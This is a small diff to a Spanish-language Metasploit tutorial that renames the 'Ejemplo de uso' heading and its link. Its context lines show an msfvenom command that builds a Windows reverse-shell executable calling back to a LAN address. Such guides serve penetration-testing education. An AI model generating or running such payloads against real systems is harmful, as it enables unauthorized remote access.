@@ -10,7 +10,7 @@ author: Conde
   - [Instalación](#instalación)
   - [Parámetros](#parametros)
   - [Msfvenom](#msfvenom)
-  - [Ejemplo de uso](#ejemplo)
+  - [Ejemplo de uso](#ejemplo-de-uso)
   - [Armitage](#armitage)
     - [Instalación](#instalación)
 
@@ -92,7 +92,7 @@ Generar un payload para otorgar una shell con python para windows
 msfvenom -p /python/shell_reverse_tcp lhost=192.168.20.123 lport 888 -f exe -o shell.exe
 ```
 
-#### Ejemplo
+#### Ejemplo de uso
 Ahora veremos un ejemplo de uso de metasploit, para realizar un escaneo de puertos. 
 1. Comezamos lanzando metasploit 
 ```bash
